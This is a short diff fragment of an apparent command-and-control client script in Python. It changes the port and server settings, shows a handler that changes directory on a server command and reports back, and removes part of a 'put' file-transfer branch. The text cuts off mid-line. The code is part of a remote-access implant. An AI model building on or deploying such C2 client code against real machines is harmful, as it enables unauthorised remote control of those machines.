@@ -9,7 +9,8 @@ from C2utils import snd_msg, get_msg, snd_file, get_file
 
 #############################
 ## ========  Config  ========
-PORT = 5050 ## CONFIGURE THIS
+PORT = 5052 ## CONFIGURE THIS
+#SERVER = socket.gethostbyname(socket.gethostname()) ## CONFIGURE THIS
 SERVER = '10.96.10.191'
 ## --------------------------
 FORMAT = 'utf-8'
@@ -47,8 +48,4 @@ def listen_to_server(conn):
                 os.chdir(abs_path)
                 snd_msg(conn, os.getcwd())
             except:
-                snd_msg(conn, "Failed to change directory.")
-
-        ## Put
-        elif msg[:3] == "put":
-            get
+                snd_msg(conn, "Failed to change dire
